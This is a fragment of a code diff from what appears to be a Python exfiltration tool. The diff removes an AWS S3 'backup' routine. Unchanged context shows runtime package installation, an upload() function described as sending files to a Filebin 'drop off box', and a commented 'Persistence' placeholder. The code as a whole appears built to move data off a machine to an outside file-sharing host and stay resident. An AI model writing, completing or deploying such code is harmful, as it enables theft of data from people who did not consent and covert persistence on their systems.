@@ -76,26 +76,9 @@ def install(package):
     else:
         make_global(package) # import requests at global level
 
-def aws_backup():
-    try:
-        install("boto3")
-    except ModuleNotFoundError:
-        print("boto3 not found")
-    else:
-        client = boto3.client(
-            "s3",
-            aws_access_key_id = 
-            aws_secret_access_key =
-        )
-        response = client.list_buckets()
-        print(response)
-
-    pass
-
 def make_global(lib):
-    global requests, boto3
+    global requests
     requests = __import__(lib, globals(), locals())
-    boto3 = __import__(lib, globals(), locals())
 
 def upload(): 
     # second storage (upload to drop off box - Filebin)
@@ -117,8 +100,6 @@ def upload():
     else:
         print("File upload failed. Status code:", response.status_code)
         print("Error message:", response.text)
-
-    aws_backup()
 
 # func presistence()
 # Persistence
